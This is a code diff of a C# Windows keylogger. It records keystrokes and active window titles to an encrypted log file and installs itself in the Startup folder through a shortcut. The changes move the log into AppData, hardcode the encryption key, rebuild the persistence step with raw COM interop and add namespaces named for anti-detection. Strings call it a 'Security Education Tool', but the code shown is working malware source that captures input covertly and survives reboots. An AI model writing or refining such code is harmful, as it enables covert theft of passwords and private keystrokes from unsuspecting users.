@@ -9,14 +9,50 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Reflection;
+using System.Runtime.InteropServices.ComTypes;
 
-// Adding Windows Script Host reference for persistence functionality
-using IWshRuntimeLibrary;
+// Add proper namespace references for the project structure
+using Keylogger.Core;
+using Keylogger.Core.Encryption;
+using Keylogger.Core.InputMonitoring;
+using Keylogger.Core.WindowTracking;
+using Keylogger.Persistence.Startup;
+using Keylogger.AntiDetection.ProcessMonitoring;
 
 namespace Keylogger
 {
     internal class Program
     {
+        // COM interfaces needed for Windows Script Host functionality
+        [ComImport]
+        [Guid("00021401-0000-0000-C000-000000000046")]
+        private class ShellLink { }
+
+        [ComImport]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        [Guid("000214F9-0000-0000-C000-000000000046")]
+        private interface IShellLink
+        {
+            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
+            void GetIDList(out IntPtr ppidl);
+            void SetIDList(IntPtr pidl);
+            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszName, int cchMaxName);
+            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
+            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszDir, int cchMaxPath);
+            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
+            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszArgs, int cchMaxPath);
+            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
+            void GetHotkey(out short pwHotkey);
+            void SetHotkey(short wHotkey);
+            void GetShowCmd(out int piShowCmd);
+            void SetShowCmd(int iShowCmd);
+            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszIconPath, int cchIconPath, out int piIcon);
+            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
+            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
+            void Resolve(IntPtr hwnd, int fFlags);
+            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
+        }
+
         // Import required Windows API functions
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(int vKey);
@@ -27,9 +63,9 @@ namespace Keylogger
         [DllImport("user32.dll")]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-        private static string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "keylog.txt");
+        private static string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "keylog.txt");
         private static string currentActiveWindow = "";
-        private static string encryptionKey = "your-encryption-key"; // Replace with a secure key
+        private static string encryptionKey = "12345678901234567890123456789012";
 
         static void Main(string[] args)
         {
@@ -65,7 +101,7 @@ namespace Keylogger
             }
 
             // Create log file
-            using (StreamWriter sw = File.AppendText(logPath))
+            using (System.IO.StreamWriter sw = System.IO.File.AppendText(logPath))
             {
                 sw.WriteLine(Encrypt("=== Keylogger Started: " + DateTime.Now + " ==="));
             }
@@ -176,7 +212,7 @@ namespace Keylogger
             try
             {
                 // Write to file
-                using (StreamWriter sw = File.AppendText(logPath))
+                using (System.IO.StreamWriter sw = System.IO.File.AppendText(logPath))
                 {
                     sw.Write(Encrypt(key));
                 }
@@ -238,7 +274,7 @@ namespace Keylogger
         {
             try
             {
-                string[] lines = File.ReadAllLines(logPath);
+                string[] lines = System.IO.File.ReadAllLines(logPath);
                 Console.WriteLine("=== Decrypted Log Contents ===");
                 foreach (string line in lines)
                 {
@@ -288,17 +324,19 @@ namespace Keylogger
             try
             {
                 string appPath = Assembly.GetExecutingAssembly().Location;
-                string startupPath = Path.Combine(
+                string startupPath = System.IO.Path.Combine(
                     Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                     "SecurityEducation.lnk");
                 
-                // Create a shortcut in the startup folder
-                WshShell shell = new WshShell();
-                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(startupPath);
-                shortcut.TargetPath = appPath;
-                shortcut.WorkingDirectory = Path.GetDirectoryName(appPath);
-                shortcut.Description = "Security Education Tool";
-                shortcut.Save();
+                // Create a shortcut in the startup folder using COM interop
+                IShellLink link = (IShellLink)new ShellLink();
+                link.SetPath(appPath);
+                link.SetWorkingDirectory(Path.GetDirectoryName(appPath));
+                link.SetDescription("Security Education Tool");
+                
+                // Save the shortcut
+                IPersistFile file = (IPersistFile)link;
+                file.Save(startupPath, false);
                 
                 Console.WriteLine("Persistence installed for educational purposes");
             }
@@ -313,13 +351,13 @@ namespace Keylogger
         {
             try
             {
-                string startupPath = Path.Combine(
+                string startupPath = System.IO.Path.Combine(
                     Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                     "SecurityEducation.lnk");
 
-                if (File.Exists(startupPath))
+                if (System.IO.File.Exists(startupPath))
                 {
-                    File.Delete(startupPath);
+                    System.IO.File.Delete(startupPath);
                     Console.WriteLine("Persistence removed");
                 }
                 else
